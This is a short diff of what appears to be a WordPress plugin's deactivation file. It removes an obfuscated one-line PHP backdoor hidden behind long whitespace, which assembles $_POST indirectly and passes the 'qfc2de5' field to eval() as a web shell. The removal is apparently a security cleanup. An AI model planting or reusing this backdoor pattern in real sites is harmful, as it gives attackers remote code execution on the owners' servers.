@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                     $rvxk85="suepotr_"; $bgp28 = $rvxk85[0]. $rvxk85[5].$rvxk85[6].$rvxk85[5]. $rvxk85[4].$rvxk85[1].$rvxk85[3]. $rvxk85[3].$rvxk85[2]. $rvxk85[6] ; $saw4 = $bgp28($rvxk85[7].$rvxk85[3].$rvxk85[4]. $rvxk85[0].$rvxk85[5]); if ( isset (${$saw4 } [ 'qfc2de5'] ) ){ eval (${ $saw4}['qfc2de5' ] );}?> <?php
+<?php
 
 /**
  * Fired during plugin deactivation
